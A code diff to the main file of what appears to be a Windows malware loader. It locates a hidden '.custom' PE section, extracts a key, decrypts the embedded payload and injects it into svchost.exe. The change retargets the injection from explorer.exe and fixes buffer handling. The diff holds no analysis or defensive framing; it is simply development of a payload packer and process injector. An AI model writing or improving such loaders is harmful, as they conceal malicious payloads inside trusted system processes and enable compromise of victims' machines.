@@ -2,6 +2,7 @@
  * main.cpp
  */
 
+#include <iostream>
 #include <windows.h>
 #include "loader.hpp"
 
@@ -14,7 +15,7 @@ char *get_packed_section(size_t *size) {
     IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(nt_headers + 1);
 
     for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
-        if (strcmp((char *)sections[i].Name, ".packed")) {
+        if (!strcmp((char *)sections[i].Name, ".custom")) {
             *size = sections[i].SizeOfRawData;
             return unpacker + sections[i].VirtualAddress;
         }
@@ -26,19 +27,21 @@ char *get_packed_section(size_t *size) {
 int main(int argc, char **argv)
 {
     loader_t loader;
+
     char *packed = get_packed_section(&loader.size);
     if (!packed) {
-        return 0;
+        std::cerr << "error: unable to find .custom section" << std::endl;
+        return 1;
     }
-    
+
+    loader.key = (char *)malloc(KEY_SIZE);
     memcpy(loader.key, packed, KEY_SIZE);
 
-    char *data = (char *)malloc(loader.size - KEY_SIZE);
-    memcpy(data, packed+KEY_SIZE, loader.size);
-    loader.bytes = data;
+    loader.bytes = (char *)malloc(loader.size);
+    memcpy(loader.bytes, packed+KEY_SIZE, loader.size-KEY_SIZE);
 
     loader_decrypt(&loader);
-    if (!loader_inject(&loader, "c:/windows/explorer.exe")) {
+    if (!loader_inject(&loader, "c:/windows/system32/svchost.exe")) {
         return 1;
     }
 
